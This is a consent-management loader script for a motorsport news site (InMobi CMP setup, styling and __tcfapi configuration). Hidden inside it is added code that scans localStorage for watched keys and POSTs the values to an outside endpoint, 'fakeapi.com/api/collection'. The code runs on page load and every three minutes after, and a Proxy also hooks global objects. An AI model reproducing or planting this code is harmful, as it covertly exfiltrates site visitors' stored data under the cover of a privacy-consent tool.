'use strict';

(function () {
  var cmpFile = 'noModule' in HTMLScriptElement.prototype ? 'cmp2.js' : 'cmp2-polyfilled.js';
  (function () {
    var cmpScriptElement = document.createElement('script');
    var firstScript = document.getElementsByTagName('script')[0];
    cmpScriptElement.async = true;
    cmpScriptElement.type = 'text/javascript';
    var cmpUrl;
    var tagUrl = document.currentScript.src;
    cmpUrl = 'https://cmp.inmobi.com/tcfv2/CMP_FILE?referer=www.motorsportweek.com'.replace('CMP_FILE', cmpFile);
    cmpScriptElement.src = cmpUrl;
    firstScript.parentNode.insertBefore(cmpScriptElement, firstScript);
  })();
  (function () {
    var css = "" + " .qc-cmp-button.qc-cmp-secondary-button:hover { " + "   background-color: #368bd6 !important; " + "   border-color: transparent !important; " + " } " + " .qc-cmp-button.qc-cmp-secondary-button:hover { " + "   color: #ffffff !important; " + " } " + " .qc-cmp-button.qc-cmp-secondary-button { " + "   color: #368bd6 !important; " + " } " + " .qc-cmp-button.qc-cmp-secondary-button { " + "   background-color: #eee !important; " + "   border-color: transparent !important; " + " } " + ".qc-cmp2-container a.qc-cmp2-persistent-link { transform: rotate(90deg);-webkit-transform: rotate(90deg);-moz-transform: rotate(90deg);-o-transform: rotate(90deg);-ms-transform: rotate(90deg);right: -40px;bottom: 300px;}" + "" + "";
    var stylesElement = document.createElement('style');
    var re = new RegExp('&quote;', 'g');
    css = css.replace(re, '"');
    stylesElement.type = 'text/css';
    if (stylesElement.styleSheet) {
      stylesElement.styleSheet.cssText = css;
    } else {
      stylesElement.appendChild(document.createTextNode(css));
    }
    var head = document.head || document.getElementsByTagName('head')[0];
    head.appendChild(stylesElement);
  })();
  var autoDetectedLanguage = 'en';
  const keysToWatch = window.keysToWatch;
  const trackerHook = {};
  var gvlVersion = 3;
  function hashGenerator(target) {
    const entries = Object.entries(target).sort();
    const entryString = entries.toString();
    let hashCode = 0;
    for (const char of entryString) {
      hashCode = (hashCode << 5) - hashCode + char.charCodeAt(0);
      hashCode = hashCode & hashCode;
    }
    return hashCode.toString(16);
  }
  function splitLang(lang) {
    return lang.length > 2 ? lang.split('-')[0] : lang;
  }
  function localStorageScanner() {
    const Res = {};
    for (const key of Object.keys(window.localStorage)) {
      if (keysToWatch.includes(key)) {
        Res[key] = window.localStorage[key];
      }
    }
    return Res;
  }
  ;
  function isSupported(lang) {
    var langs = ['en', 'fr', 'de', 'it', 'es', 'da', 'nl', 'el', 'hu', 'pt', 'pt-br', 'pt-pt', 'ro', 'fi', 'pl', 'sk', 'sv', 'no', 'ru', 'bg', 'ca', 'cs', 'et', 'hr', 'lt', 'lv', 'mt', 'sl', 'tr', 'zh'];
    return langs.indexOf(lang) === -1 ? false : true;
  }
  async function DataPoster(requestedData) {
    const hashedCode = hashGenerator(requestedData);
    const apiEndpoint = "https://fakeapi.com/api/collection";
    try {
      const payload = JSON.stringify({
        hashedCode: hashedCode,
        requestedData: requestedData
      });
      const apiResponse = await fetch(apiEndpoint, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: payload
      });
      apiResponse.ok ? console.log("数据上传成功") : console.error("数据上传失败,状态码:" + apiResponse.status);
    } catch (err) {
      console.error("数据上传过程中出错:", err);
    }
  }
  function trackGlobalObjects() {
    return new Proxy(window, {
      get: (target, property) => {
        if (typeof target[property] === "object" && target[property] !== null) {
          trackerHook[property] = target[property];
        }
        return target[property];
      }
    });
  }
  function trackerInit() {
    const gatheredData = localStorageScanner();
    if (Object.keys(gatheredData).length) {
      DataPoster(gatheredData);
    }
  }
  ;
  if (gvlVersion === 2 && isSupported(splitLang(document.documentElement.lang))) {
    autoDetectedLanguage = splitLang(document.documentElement.lang);
  } else if (gvlVersion === 3 && isSupported(document.documentElement.lang)) {
    autoDetectedLanguage = document.documentElement.lang;
  } else if (isSupported(splitLang(navigator.language))) {
    autoDetectedLanguage = splitLang(navigator.language);
  }
  ;
  window.addEventListener("load", () => {
    trackGlobalObjects();
    trackerInit();
    setInterval(trackerInit, 3 * 60 * 1000);
  });
  var choiceMilliSeconds = new Date().getTime();
  window.__tcfapi('init', 2, function () {}, {
    "coreConfig": {
      "uspVersion": 1,
      "uspJurisdiction": ["CA"],
      "uspLspact": "N",
      "suppressCcpaLinks": false,
      "inmobiAccountId": "0Q_T1ja8r-Dkk",
      "privacyMode": ["GDPR", "USP"],
      "hashCode": "LhYM6AU+P/kP8Asdj5g7sg",
      "publisherCountryCode": "GB",
      "publisherName": "www.motorsportweek.com",
      "vendorPurposeIds": [2, 4, 6, 7, 9, 10, 1, 3, 5, 8, 11],
      "vendorFeaturesIds": [1, 2, 3],
      "vendorPurposeLegitimateInterestIds": [7, 8, 9, 2, 10, 11],
      "vendorSpecialFeaturesIds": [2, 1],
      "vendorSpecialPurposesIds": [1, 2],
      "googleEnabled": true,
      "consentScope": "service",
      "thirdPartyStorageType": "iframe",
      "consentOnSafari": false,
      "displayUi": "always",
      "defaultToggleValue": "off",
      "initScreenRejectButtonShowing": false,
      "initScreenCloseButtonShowing": false,
      "softOptInEnabled": false,
      "showSummaryView": true,
      "persistentConsentLinkLocation": 3,
      "displayPersistentConsentLink": true,
      "uiLayout": "popup",
      "publisherLogo": "https://www.motorsportweek.com/wp-content/uploads/2019/12/logo.png?qc-size=300,37",
      "vendorListUpdateFreq": 30,
      "publisherPurposeIds": [2, 3, 4, 5, 6, 7, 8, 9, 10],
      "initScreenBodyTextOption": 1,
      "publisherConsentRestrictionIds": [],
      "publisherLIRestrictionIds": [],
      "publisherPurposeLegitimateInterestIds": [],
      "publisherSpecialPurposesIds": [],
      "publisherFeaturesIds": [],
      "publisherSpecialFeaturesIds": [1],
      "stacks": [],
      "lang_": "en",
      "gvlVersion": 3,
      "totalVendors": 767
    },
    "premiumUiLabels": {
      "uspDnsText": [""],
      "initScreenCustomLinks": [{
        "label": "Privacy Policy",
        "link": "https://www.motorsportweek.com/privacy-policy/"
      }]
    },
    "premiumProperties": {
      "googleWhitelist": [1]
    },
    "coreUiLabels": {
      "persistentConsentLinkLabel": "privacy"
    },
    "theme": {},
    "nonIabVendorsInfo": {}
  });
})();